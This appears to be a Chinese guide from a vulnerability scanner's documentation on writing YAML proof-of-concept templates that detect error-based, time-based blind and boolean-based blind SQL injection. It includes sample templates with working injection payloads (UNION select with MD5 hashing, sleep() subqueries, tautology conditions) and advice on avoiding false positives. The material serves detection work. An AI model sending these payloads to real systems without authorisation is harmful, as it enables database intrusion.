# SQL Injection（SQL注入）

对于sql注入相关漏洞的检测，大致分为三种类型，这里分别进行分析

!> 测试SQL注入漏洞，无论是哪种类型，都请不要使用`user()`、`version()`等函数来辅助验证漏洞的存在与否。此类规则**太过宽泛**，不同系统之间显示的内容都有不同的可能，在匹配时具有一定的随机性

## 有回显注入（error based and other）

有回显的注入检测比较简单，这里以报错注入为例进行讲解

```yaml
name: poc-yaml-test-sqli-echo-based
manual: true
transport: http
set:
	r1: randomInt(8000, 10000)
rules:
	r0:
		request:
			cache: true
			method: GET
			path: /xxx.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),db_name(1),5,6,7
		expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
expression: r0()
detail:
	author: chaitin
	links:
		- http://example.com
```

在这类的poc中，至少有一个rule会是关于sql注入的语句，但是对于结果的展示可能并不会在同一个rule中，所以下面分为两个部分讲解审核中需要注意的问题

- 对于存在`sql注入语句`的rule
    1. 对于给出的SQL注入语句
        - 语句正确无误，能够符合目标系统检出对应的漏洞，必要时可以添加一些绕过方法增加检出率
        - 对于需要验证的变量，`一定`要使用对应sql中能够使用的编码函数处理后再进行匹配，绝对不可以使用`固定值`或者`原内容`
- 对于`验证注入结果`的rule
    1. 注意返回值的编码问题，需要与注入语句中所给出的内容相同
    2. 注意返回值的长度，在部分系统中，返回内容的长度和起始位置与直接编码的结果并不相同（`updatexml`、`extractvalue` 报错回显结果可能会被截断），这时就需要使用substr等函数截取后再进行匹配

### 模板

[有回显注入](/guide/yaml/yaml_poc_template?id=普通注入)

## 时间盲注（time based）

时间盲注的检测要稍微复杂一些，同时存在着因为网络环境等误报漏报的问题，这里举例讲解如何尽可能地减少这种误报

```yaml
name: poc-yaml-test-sqli-time-based
manual: true
transport: http
set:
	randSecond1: randomInt(5, 7)
	randSecond2: randomInt(2, 4)
rules:
	r0:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep(0)))v)%2B%27/
		expression: response.status == 200
		output:
			undelayedLantency: response.latency
	r1:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep({{randSecond1}})))v)%2B%27/
            read_timeout: "10"
		expression: response.latency - undelayedLantency >= randSecond1 * 1000 - 500 && response.status == 200 && response.body.bcontains(b"{\"code\":200")
	r2:
		request:
			cache: false
			method: GET
			path: /xxx?keyword=%27%2B(select(0)from(select(sleep({{randSecond2}})))v)%2B%27/
            read_timeout: "10"
		expression: response.latency - undelayedLantency >= randSecond2 * 1000 - 500 && response.status == 200 && response.body.bcontains(b"{\"code\":200")
expression: r0() && r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

对于时间盲注来说，我们首先需要保证出了延时的不同，path的其他部分都要保证完全一致。那么当我们发送对应的payload时，至少是能排除掉因为访问路径或者参数的不同所导致的时间差异问题

同时这里分别说明一下基础的三个请求分别所对应的意义
- 第一个请求：延时为0，测出访问对应站点时的基础延时
- 第二个请求：延时一定不为0，且时长定在(5, 7)秒，通过延长一个较长的时间来发现是否发生一个延时，但是这个内容可能收到系统方面相关网络波动的影响分
- 第三个请求：延时一定不为0，且时长一定小于第二个请求中的延时，通过一个较短的时间判断这个延时一定是因为sql注入所发生的

那么依据上边所分析出来的内容，我们可以得到以下的要求

- 在第一条关于注入的rule中
    1. 关于注入的内容
        - 关于request的内容，除时间不同以外，`一定`要与第二条rule中的request信息保持一致
        - sleep的时间一定是`0s`
    2. 关于匹配的expression
        - 符合接口的返回内容即可，比较`推荐`在其中匹配一些特有的返回结果，尽可能地消除网络环境所带来的误报问题，但是不做强求
    3. 关于output的内容
        - 这条rule一定会有output的内容，其中的变量存储着这一条请求所花费的时间
- 在第二条关于注入的rule中
    1. 关于注入的内容
        - 关于request的内容，除时间不同以外，`一定`要与第一条rule中的request信息保持一致
        - sleep的时间需要设置随机值，同时随机值的最小值一定不能小于`3s`，避免数值过小带来的网络波动问题
    2. 关于匹配的expression
        - 一定需要对访问时间的差值进行比较，确保两个相似请求之间的时间差异全部是由sleep所造成的
        - 同时无特殊的情况下，`建议`除了时间差值的比较之外，其他的内容与第一条相同
- 在第三条关于注入的rule中
    - 这一条的内容与第二条除了时间的取值都相同即可
- **一定要注意添加read_timeout: "10"，不然扫描器会直接不等响应完就根据默认时间直接结束，同时要注意该漏洞的payload是否会被执行多次，造成等待时间翻倍的情况，如果存在，请自行缩短sleep时长，同时提高read_timeout的值**

?> 这里强求对页面中的部分内容进行匹配，目的是为了作为目标系统的指纹，消除网络环境的影响，防止一些不相干的系统造成的误报。同时匹配的内容不用过多，体现出目标系统的独特性即可

### 模板

[时间盲注](/guide/yaml/yaml_poc_template?id=时间盲注)

## 布尔盲注（boolean based）

布尔盲注与时间盲注相似，都是一定会存在两个包含sql注入语句的rule，这里举例分析

```yaml
name: poc-yaml-test-sqli-boolean-based
manual: true
transport: http
set:
	s1: randomLowercase(5)
	a1: randomInt(1000, 9000)
	a2: randomInt(1000, 9000)
rules:
r0:
	request:
		cache: true
		method: POST
		path: /xxx.cgi
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a2}} and %27{{s1}}%27=%27{{s1}}
		follow_redirects: true
	expression: response.body.bcontains(b"id=\"lblWarning\">User authentication Failed")
r1:
	request:
		cache: true
		method: POST
		path: /xxx.cgi
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: USERDBDomains.Domainname=geardomain%27 and {{a1}}={{a1}} and %27{{s1}}%27=%27{{s1}}
		follow_redirects: true
	expression: response.body.bcontains(b"id=\"lblWarning\">User Login Failed for SSLVPN User")
expression: r0() && r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

大体的验证方法与实时间盲注相同，这里说明下几个需要注意的点
- 所匹配的页面内容一定是最终的内容，follow_redirects为true时需要匹配重定向后页面的内容
- 选取的匹配内容一定是条件为真或条件为假时所出现的`特有内容`，两者不可重叠，否则及其容易出现误报的现象
- 在匹配一些关键词的时候，如果r0中匹配了"EMPNAME"，那么r1中就应该写不匹配这个"EMPNAME"的语句，也就是`!response.body_string.contains("EMPNAME")`

### 模板

[布尔盲注](/guide/yaml/yaml_poc_template?id=布尔盲注)
